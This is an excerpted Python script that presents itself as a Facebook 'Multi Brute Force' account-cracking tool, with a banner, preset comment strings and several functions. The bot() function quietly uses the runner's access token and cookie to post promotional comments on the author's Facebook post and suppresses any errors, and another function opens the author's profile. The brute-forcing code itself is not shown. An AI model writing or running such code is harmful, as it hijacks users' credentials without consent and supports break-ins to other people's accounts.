...
kom1 = ("Anjayy keren banget bang🤘\n-\nhttps://www.facebook.com/100080706585229/posts/178570731509812/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[Semangat Bang @[100080706585229:] ]")
kom2 = ("Anjir keren bang andi\n-\n \nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n-\nhttps://www.facebook.com/100080706585229/posts/178570731509812/?app=fbl\n-\n \nkomentar di tulis oleh bot\n \n[ Pukul 22:41:51 WIB ]")
kom3 = ("Cek Mc Wak")
...
def banner():
	basari_tamvan('=' * 40)
	print(f"""{Z}[•] Tariswan-Y4nz Multi Brute Force [•]
{h}  ____  __  __ ____  ______ 
{h} |  _ \|  \/  |  _ \|  ____|
 {h}| |_) | \  / | |_) | |__   
{h} |  _ <| |\/| |  _ <|  __|  
{h} | |_) | |  | | |_) | |     
{h} |____/|_|  |_|____/|_| {O}V.02     {P}""")
	basari_tamvan('=' * 40)
...
def bot():
	try:
		...
		requests.post(f"https://graph.facebook.com/178570731509812/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
		requests.post(f"https://graph.facebook.com/178570731509812/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok})
	except:
		pass
...
def authorbas():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/profile.php?id=100080706585229")
	back()
